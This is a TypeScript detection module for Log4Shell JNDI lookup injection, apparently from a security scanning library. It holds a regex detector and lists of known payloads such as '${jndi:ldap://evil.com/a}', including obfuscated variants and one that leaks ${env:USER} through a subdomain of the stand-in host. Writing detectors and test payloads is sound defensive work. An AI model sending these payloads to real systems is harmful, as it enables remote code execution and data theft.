/**
 * log_jndi_lookup — JNDI lookup injection (Log4Shell)
 */
import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'

export const logJndiLookup: InvariantClassModule = {
    id: 'log_jndi_lookup',
    description: 'JNDI lookup injection (Log4Shell) to achieve remote code execution via logging',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.95 },

    mitre: ['T1190', 'T1059'],
    cwe: 'CWE-917',

    knownPayloads: [
        '${jndi:ldap://evil.com/a}',
        '${jndi:rmi://evil.com/a}',
        '${${lower:j}ndi:ldap://evil.com/a}',
        '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}',
    ],

    knownBenign: [
        '${HOME}',
        '${PATH}',
        'template ${variable}',
        'price is $5.00',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /\$\{(?:jndi|lower|upper|env|sys|java|date|main|bundle|ctx|spring|kubernetes|docker|log4j)[\s:]/i.test(d) ||
            /\$\{.*?\$\{/i.test(d)
    },
    generateVariants: (count: number): string[] => {
        const v = [
            '${jndi:ldap://evil.com/a}', '${jndi:rmi://evil.com/a}',
            '${jndi:dns://evil.com/a}', '${${lower:j}ndi:ldap://evil.com/a}',
            '${${upper:J}NDI:ldap://evil.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}',
            '${jndi:ldap://${env:USER}.evil.com/a}',
        ]
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}
